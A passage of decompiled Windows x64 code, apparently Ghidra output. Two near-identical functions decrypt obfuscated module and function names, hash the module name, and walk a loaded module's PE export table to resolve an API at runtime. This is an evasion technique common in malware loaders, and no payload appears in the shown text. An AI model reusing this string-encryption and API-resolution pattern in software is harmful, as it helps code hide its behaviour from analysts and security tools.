  local_f8[0x42] = 0;
  local_f8[0x43] = 0;
  local_f8[0x44] = 0;
  local_f8[0x45] = 0;
  local_f8[0x46] = 0;
  local_f8[0x47] = 0;
  local_f8[0x48] = 0;
  local_f8[0x49] = 0;
  local_f8[0x4a] = 0;
  local_f8[0x4b] = 0;
  local_f8[0x4c] = 0;
  local_f8[0x4d] = 0;
  local_f8[0x4e] = 0;
  local_f8[0x4f] = 0;
  local_f8[0x50] = 0;
  local_f8[0x51] = 0;
  local_f8[0x52] = 0;
  local_f8[0x53] = 0;
  local_f8[0x54] = 0;
  local_f8[0x55] = 0;
  local_f8[0x56] = 0;
  local_f8[0x57] = 0;
  local_f8[0x58] = 0;
  local_f8[0x59] = 0;
  local_f8[0x5a] = 0;
  local_f8[0x5b] = 0;
  local_f8[0x5c] = 0;
  local_f8[0x5d] = 0;
  local_f8[0x5e] = 0;
  local_f8[0x5f] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x60] = 0;
  local_f8[0x61] = 0;
  local_f8[0x62] = 0;
  local_f8[99] = 0;
  local_f8[100] = 0;
  local_f8[0x65] = 0;
  local_f8[0x66] = 0;
  local_f8[0x67] = 0;
  local_f8[0x68] = 0;
  local_f8[0x69] = 0;
  local_f8[0x6a] = 0;
  local_f8[0x6b] = 0;
  local_f8[0x6c] = 0;
  local_f8[0x6d] = 0;
  local_f8[0x6e] = 0;
  local_f8[0x6f] = 0;
  local_f8[0x70] = 0;
  local_f8[0x71] = 0;
  local_f8[0x72] = 0;
  local_f8[0x73] = 0;
  local_f8[0x74] = 0;
  local_f8[0x75] = 0;
  local_f8[0x76] = 0;
  local_f8[0x77] = 0;
  local_f8[0x78] = 0;
  local_f8[0x79] = 0;
  local_f8[0x7a] = 0;
  local_f8[0x7b] = 0;
  local_f8[0x7c] = 0;
  local_f8[0x7d] = 0;
  local_f8[0x7e] = 0;
  local_f8[0x7f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x80] = 0;
  local_f8[0x81] = 0;
  local_f8[0x82] = 0;
  local_f8[0x83] = 0;
  local_f8[0x84] = 0;
  local_f8[0x85] = 0;
  local_f8[0x86] = 0;
  local_f8[0x87] = 0;
  local_f8[0x88] = 0;
  local_f8[0x89] = 0;
  local_f8[0x8a] = 0;
  local_f8[0x8b] = 0;
  local_f8[0x8c] = 0;
  local_f8[0x8d] = 0;
  local_f8[0x8e] = 0;
  local_f8[0x8f] = 0;
  local_f8[0x90] = 0;
  local_f8[0x91] = 0;
  local_f8[0x92] = 0;
  local_f8[0x93] = 0;
  local_f8[0x94] = 0;
  local_f8[0x95] = 0;
  local_f8[0x96] = 0;
  local_f8[0x97] = 0;
  local_f8[0x98] = 0;
  local_f8[0x99] = 0;
  local_f8[0x9a] = 0;
  local_f8[0x9b] = 0;
  local_f8[0x9c] = 0;
  local_f8[0x9d] = 0;
  local_f8[0x9e] = 0;
  local_f8[0x9f] = 0;
  local_f8[0xa0] = 0;
  local_f8[0xa1] = 0;
  local_f8[0xa2] = 0;
  local_f8[0xa3] = 0;
  local_f8[0xa4] = 0;
  local_f8[0xa5] = 0;
  local_f8[0xa6] = 0;
  local_f8[0xa7] = 0;
  local_f8[0xa8] = 0;
  local_f8[0xa9] = 0;
  local_f8[0xaa] = 0;
  local_f8[0xab] = 0;
  local_f8[0xac] = 0;
  local_f8[0xad] = 0;
  local_f8[0xae] = 0;
  local_f8[0xaf] = 0;
  local_f8[0xb0] = 0;
  local_f8[0xb1] = 0;
  local_f8[0xb2] = 0;
  local_f8[0xb3] = 0;
  local_f8[0xb4] = 0;
  local_f8[0xb5] = 0;
  local_f8[0xb6] = 0;
  local_f8[0xb7] = 0;
  local_f8[0xb8] = 0;
  local_f8[0xb9] = 0;
  local_f8[0xba] = 0;
  local_f8[0xbb] = 0;
  local_f8[0xbc] = 0;
  local_f8[0xbd] = 0;
  local_f8[0xbe] = 0;
  local_f8[0xbf] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11 + 0x40] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(uVar11 + param_2);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 0xc);
  lVar10 = 0;
  uVar12 = 0x1505;
  bVar2 = local_f8[0];
  for (uVar11 = 0; (bVar2 != 0 && (uVar11 < 0x3f)); uVar11 = uVar11 + 1) {
    uVar12 = (local_f8[uVar11] | 0x20) ^ uVar12 * 0x21;
    bVar2 = local_f8[uVar11 + 1];
  }
  psVar3 = (short *)FUN_140001950(uVar12);
  if (((psVar3 != (short *)0x0) && (*psVar3 == 0x5a4d)) &&
     (uVar12 = *(uint *)((longlong)*(int *)(psVar3 + 0x1e) + 0x88 + (longlong)psVar3),
     uVar11 = (ulonglong)uVar12, uVar12 != 0)) {
    uVar12 = *(uint *)((longlong)psVar3 + uVar11 + 0x18);
    uVar14 = 0;
    if (uVar12 != 0) {
      do {
        pbVar8 = local_f8 + 0x40;
        pbVar4 = (byte *)((ulonglong)
                          *(uint *)((longlong)psVar3 +
                                   uVar14 * 4 +
                                   (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x20)) +
                         (longlong)psVar3);
        bVar2 = *pbVar4;
        while ((bVar2 != 0 && (bVar2 == *pbVar8))) {
          pbVar1 = pbVar4 + 1;
          pbVar4 = pbVar4 + 1;
          pbVar8 = pbVar8 + 1;
          bVar2 = *pbVar1;
        }
        if (*pbVar4 == *pbVar8) {
          lVar10 = (ulonglong)
                   *(uint *)((longlong)psVar3 +
                            (ulonglong)
                            *(ushort *)
                             ((longlong)psVar3 +
                             uVar14 * 2 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x24)) *
                            4 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x1c)) +
                   (longlong)psVar3;
          goto LAB_1400079d6;
        }
        uVar13 = (int)uVar14 + 1;
        uVar14 = (ulonglong)uVar13;
      } while (uVar13 < uVar12);
    }
    lVar10 = 0;
  }
LAB_1400079d6:
  lVar5 = 0;
  do {
    local_f8[lVar5] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x40);
  lVar5 = 0;
  do {
    local_f8[lVar5 + 0x40] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x80);
  return lVar10;
}


// ==== FUN_140007a40 @ 140007a40 size 955

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

longlong FUN_140007a40(longlong param_1,longlong param_2)

{
  byte *pbVar1;
  byte bVar2;
  short *psVar3;
  byte *pbVar4;
  longlong lVar5;
  uint uVar6;
  uint uVar7;
  byte *pbVar8;
  uint uVar9;
  longlong lVar10;
  ulonglong uVar11;
  uint uVar12;
  uint uVar13;
  ulonglong uVar14;
  uint uVar15;
  uint uVar16;
  undefined1 auStack_118 [32];
  byte local_f8 [192];
  ulonglong local_38;
  
  local_38 = DAT_140010000 ^ (ulonglong)auStack_118;
  uVar13 = *(uint *)(param_1 + 0xc);
  uVar11 = 0;
  local_f8[0] = 0;
  local_f8[1] = 0;
  local_f8[2] = 0;
  local_f8[3] = 0;
  local_f8[4] = 0;
  local_f8[5] = 0;
  local_f8[6] = 0;
  local_f8[7] = 0;
  local_f8[8] = 0;
  local_f8[9] = 0;
  local_f8[10] = 0;
  local_f8[0xb] = 0;
  local_f8[0xc] = 0;
  local_f8[0xd] = 0;
  local_f8[0xe] = 0;
  local_f8[0xf] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x10] = 0;
  local_f8[0x11] = 0;
  local_f8[0x12] = 0;
  local_f8[0x13] = 0;
  local_f8[0x14] = 0;
  local_f8[0x15] = 0;
  local_f8[0x16] = 0;
  local_f8[0x17] = 0;
  local_f8[0x18] = 0;
  local_f8[0x19] = 0;
  local_f8[0x1a] = 0;
  local_f8[0x1b] = 0;
  local_f8[0x1c] = 0;
  local_f8[0x1d] = 0;
  local_f8[0x1e] = 0;
  local_f8[0x1f] = 0;
  local_f8[0x20] = 0;
  local_f8[0x21] = 0;
  local_f8[0x22] = 0;
  local_f8[0x23] = 0;
  local_f8[0x24] = 0;
  local_f8[0x25] = 0;
  local_f8[0x26] = 0;
  local_f8[0x27] = 0;
  local_f8[0x28] = 0;
  local_f8[0x29] = 0;
  local_f8[0x2a] = 0;
  local_f8[0x2b] = 0;
  local_f8[0x2c] = 0;
  local_f8[0x2d] = 0;
  local_f8[0x2e] = 0;
  local_f8[0x2f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x30] = 0;
  local_f8[0x31] = 0;
  local_f8[0x32] = 0;
  local_f8[0x33] = 0;
  local_f8[0x34] = 0;
  local_f8[0x35] = 0;
  local_f8[0x36] = 0;
  local_f8[0x37] = 0;
  local_f8[0x38] = 0;
  local_f8[0x39] = 0;
  local_f8[0x3a] = 0;
  local_f8[0x3b] = 0;
  local_f8[0x3c] = 0;
  local_f8[0x3d] = 0;
  local_f8[0x3e] = 0;
  local_f8[0x3f] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(param_1 + uVar11);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 10);
  uVar13 = *(uint *)(param_2 + 0x20);
  uVar11 = 0;
  local_f8[0x40] = 0;
  local_f8[0x41] = 0;
  local_f8[0x42] = 0;
  local_f8[0x43] = 0;
  local_f8[0x44] = 0;
  local_f8[0x45] = 0;
  local_f8[0x46] = 0;
  local_f8[0x47] = 0;
  local_f8[0x48] = 0;
  local_f8[0x49] = 0;
  local_f8[0x4a] = 0;
  local_f8[0x4b] = 0;
  local_f8[0x4c] = 0;
  local_f8[0x4d] = 0;
  local_f8[0x4e] = 0;
  local_f8[0x4f] = 0;
  local_f8[0x50] = 0;
  local_f8[0x51] = 0;
  local_f8[0x52] = 0;
  local_f8[0x53] = 0;
  local_f8[0x54] = 0;
  local_f8[0x55] = 0;
  local_f8[0x56] = 0;
  local_f8[0x57] = 0;
  local_f8[0x58] = 0;
  local_f8[0x59] = 0;
  local_f8[0x5a] = 0;
  local_f8[0x5b] = 0;
  local_f8[0x5c] = 0;
  local_f8[0x5d] = 0;
  local_f8[0x5e] = 0;
  local_f8[0x5f] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x60] = 0;
  local_f8[0x61] = 0;
  local_f8[0x62] = 0;
  local_f8[99] = 0;
  local_f8[100] = 0;
  local_f8[0x65] = 0;
  local_f8[0x66] = 0;
  local_f8[0x67] = 0;
  local_f8[0x68] = 0;
  local_f8[0x69] = 0;
  local_f8[0x6a] = 0;
  local_f8[0x6b] = 0;
  local_f8[0x6c] = 0;
  local_f8[0x6d] = 0;
  local_f8[0x6e] = 0;
  local_f8[0x6f] = 0;
  local_f8[0x70] = 0;
  local_f8[0x71] = 0;
  local_f8[0x72] = 0;
  local_f8[0x73] = 0;
  local_f8[0x74] = 0;
  local_f8[0x75] = 0;
  local_f8[0x76] = 0;
  local_f8[0x77] = 0;
  local_f8[0x78] = 0;
  local_f8[0x79] = 0;
  local_f8[0x7a] = 0;
  local_f8[0x7b] = 0;
  local_f8[0x7c] = 0;
  local_f8[0x7d] = 0;
  local_f8[0x7e] = 0;
  local_f8[0x7f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x80] = 0;
  local_f8[0x81] = 0;
  local_f8[0x82] = 0;
  local_f8[0x83] = 0;
  local_f8[0x84] = 0;
  local_f8[0x85] = 0;
  local_f8[0x86] = 0;
  local_f8[0x87] = 0;
  local_f8[0x88] = 0;
  local_f8[0x89] = 0;
  local_f8[0x8a] = 0;
  local_f8[0x8b] = 0;
  local_f8[0x8c] = 0;
  local_f8[0x8d] = 0;
  local_f8[0x8e] = 0;
  local_f8[0x8f] = 0;
  local_f8[0x90] = 0;
  local_f8[0x91] = 0;
  local_f8[0x92] = 0;
  local_f8[0x93] = 0;
  local_f8[0x94] = 0;
  local_f8[0x95] = 0;
  local_f8[0x96] = 0;
  local_f8[0x97] = 0;
  local_f8[0x98] = 0;
  local_f8[0x99] = 0;
  local_f8[0x9a] = 0;
  local_f8[0x9b] = 0;
  local_f8[0x9c] = 0;
  local_f8[0x9d] = 0;
  local_f8[0x9e] = 0;
  local_f8[0x9f] = 0;
  local_f8[0xa0] = 0;
  local_f8[0xa1] = 0;
  local_f8[0xa2] = 0;
  local_f8[0xa3] = 0;
  local_f8[0xa4] = 0;
  local_f8[0xa5] = 0;
  local_f8[0xa6] = 0;
  local_f8[0xa7] = 0;
  local_f8[0xa8] = 0;
  local_f8[0xa9] = 0;
  local_f8[0xaa] = 0;
  local_f8[0xab] = 0;
  local_f8[0xac] = 0;
  local_f8[0xad] = 0;
  local_f8[0xae] = 0;
  local_f8[0xaf] = 0;
  local_f8[0xb0] = 0;
  local_f8[0xb1] = 0;
  local_f8[0xb2] = 0;
  local_f8[0xb3] = 0;
  local_f8[0xb4] = 0;
  local_f8[0xb5] = 0;
  local_f8[0xb6] = 0;
  local_f8[0xb7] = 0;
  local_f8[0xb8] = 0;
  local_f8[0xb9] = 0;
  local_f8[0xba] = 0;
  local_f8[0xbb] = 0;
  local_f8[0xbc] = 0;
  local_f8[0xbd] = 0;
  local_f8[0xbe] = 0;
  local_f8[0xbf] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11 + 0x40] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(uVar11 + param_2);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 0x1f);
  lVar10 = 0;
  uVar12 = 0x1505;
  bVar2 = local_f8[0];
  for (uVar11 = 0; (bVar2 != 0 && (uVar11 < 0x3f)); uVar11 = uVar11 + 1) {
    uVar12 = (local_f8[uVar11] | 0x20) ^ uVar12 * 0x21;
    bVar2 = local_f8[uVar11 + 1];
  }
  psVar3 = (short *)FUN_140001950(uVar12);
  if (((psVar3 != (short *)0x0) && (*psVar3 == 0x5a4d)) &&
     (uVar12 = *(uint *)((longlong)*(int *)(psVar3 + 0x1e) + 0x88 + (longlong)psVar3),
     uVar11 = (ulonglong)uVar12, uVar12 != 0)) {
    uVar12 = *(uint *)((longlong)psVar3 + uVar11 + 0x18);
    uVar14 = 0;
    if (uVar12 != 0) {
      do {
        pbVar8 = local_f8 + 0x40;
        pbVar4 = (byte *)((ulonglong)
                          *(uint *)((longlong)psVar3 +
                                   uVar14 * 4 +
                                   (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x20)) +
                         (longlong)psVar3);
        bVar2 = *pbVar4;
        while ((bVar2 != 0 && (bVar2 == *pbVar8))) {
          pbVar1 = pbVar4 + 1;
          pbVar4 = pbVar4 + 1;
          pbVar8 = pbVar8 + 1;
          bVar2 = *pbVar1;
        }
        if (*pbVar4 == *pbVar8) {
          lVar10 = (ulonglong)
                   *(uint *)((longlong)psVar3 +
                            (ulonglong)
                            *(ushort *)
                             ((longlong)psVar3 +
                             uVar14 * 2 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x24)) *
                            4 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x1c)) +
                   (longlong)psVar3;
          goto LAB_140007d96;
        }
        uVar13 = (int)uVar14 + 1;
        uVar14 = (ulonglong)uVar13;
      } while (uVar13 < uVar12);
    }
    lVar10 = 0;
  }
LAB_140007d96:
  lVar5 = 0;
  do {
    local_f8[lVar5] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x40);
  lVar5 = 0;
  do {
    local_f8[lVar5 + 0x40] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x80);
  return lVar10;
}


// ==== FUN_140007e00 @ 140007e00 size 955

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

longlong FUN_140007e00(longlong param_1,longlong param_2)

{
  byte *pbVar1;
  byte bVar2;
  short *psVar3;
  byte *pbVar4;
  longlong lVar5;
  uint uVar6;
  uint uVar7;
  byte *pbVar8;
  uint uVar9;
  longlong lVar10;
  ulonglong uVar11;
  uint uVar12;
  uint uVar13;
  ulonglong uVar14;
  uint uVar15;
  uint uVar16;
  undefined1 auStack_118 [32];
  byte local_f8 [192];
  ulonglong local_38;
  
  local_38 = DAT_140010000 ^ (ulonglong)auStack_118;
  uVar13 = *(uint *)(param_1 + 0x10);
  uVar11 = 0;
  local_f8[0] = 0;
  local_f8[1] = 0;
  local_f8[2] = 0;
  local_f8[3] = 0;
  local_f8[4] = 0;
  local_f8[5] = 0;
  local_f8[6] = 0;
  local_f8[7] = 0;
  local_f8[8] = 0;
  local_f8[9] = 0;
  local_f8[10] = 0;
  local_f8[0xb] = 0;
  local_f8[0xc] = 0;
  local_f8[0xd] = 0;
  local_f8[0xe] = 0;
  local_f8[0xf] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x10] = 0;
  local_f8[0x11] = 0;
  local_f8[0x12] = 0;
  local_f8[0x13] = 0;
  local_f8[0x14] = 0;
  local_f8[0x15] = 0;
  local_f8[0x16] = 0;
  local_f8[0x17] = 0;
  local_f8[0x18] = 0;
  local_f8[0x19] = 0;
  local_f8[0x1a] = 0;
  local_f8[0x1b] = 0;
  local_f8[0x1c] = 0;
  local_f8[0x1d] = 0;
  local_f8[0x1e] = 0;
  local_f8[0x1f] = 0;
  local_f8[0x20] = 0;
  local_f8[0x21] = 0;
  local_f8[0x22] = 0;
  local_f8[0x23] = 0;
  local_f8[0x24] = 0;
  local_f8[0x25] = 0;
  local_f8[0x26] = 0;
  local_f8[0x27] = 0;
  local_f8[0x28] = 0;
  local_f8[0x29] = 0;
  local_f8[0x2a] = 0;
  local_f8[0x2b] = 0;
  local_f8[0x2c] = 0;
  local_f8[0x2d] = 0;
  local_f8[0x2e] = 0;
  local_f8[0x2f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x30] = 0;
  local_f8[0x31] = 0;
  local_f8[0x32] = 0;
  local_f8[0x33] = 0;
  local_f8[0x34] = 0;
  local_f8[0x35] = 0;
  local_f8[0x36] = 0;
  local_f8[0x37] = 0;
  local_f8[0x38] = 0;
  local_f8[0x39] = 0;
  local_f8[0x3a] = 0;
  local_f8[0x3b] = 0;
  local_f8[0x3c] = 0;
  local_f8[0x3d] = 0;
  local_f8[0x3e] = 0;
  local_f8[0x3f] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(param_1 + uVar11);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 0xd);
  uVar13 = *(uint *)(param_2 + 0x1c);
  uVar11 = 0;
  local_f8[0x40] = 0;
  local_f8[0x41] = 0;
  local_f8[0x42] = 0;
  local_f8[0x43] = 0;
  local_f8[0x44] = 0;
  local_f8[0x45] = 0;
  local_f8[0x46] = 0;
  local_f8[0x47] = 0;
  local_f8[0x48] = 0;
  local_f8[0x49] = 0;
  local_f8[0x4a] = 0;
  local_f8[0x4b] = 0;
  local_f8[0x4c] = 0;
  local_f8[0x4d] = 0;
  local_f8[0x4e] = 0;
  local_f8[0x4f] = 0;
  local_f8[0x50] = 0;
  local_f8[0x51] = 0;
  local_f8[0x52] = 0;
  local_f8[0x53] = 0;
  local_f8[0x54] = 0;
  local_f8[0x55] = 0;
  local_f8[0x56] = 0;
  local_f8[0x57] = 0;
  local_f8[0x58] = 0;
  local_f8[0x59] = 0;
  local_f8[0x5a] = 0;
  local_f8[0x5b] = 0;
  local_f8[0x5c] = 0;
  local_f8[0x5d] = 0;
  local_f8[0x5e] = 0;
  local_f8[0x5f] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x60] = 0;
  local_f8[0x61] = 0;
  local_f8[0x62] = 0;
  local_f8[99] = 0;
  local_f8[100] = 0;
  local_f8[0x65] = 0;
  local_f8[0x66] = 0;
  local_f8[0x67] = 0;
  local_f8[0x68] = 0;
  local_f8[0x69] = 0;
  local_f8[0x6a] = 0;
  local_f8[0x6b] = 0;
  local_f8[0x6c] = 0;
  local_f8[0x6d] = 0;
  local_f8[0x6e] = 0;
  local_f8[0x6f] = 0;
  local_f8[0x70] = 0;
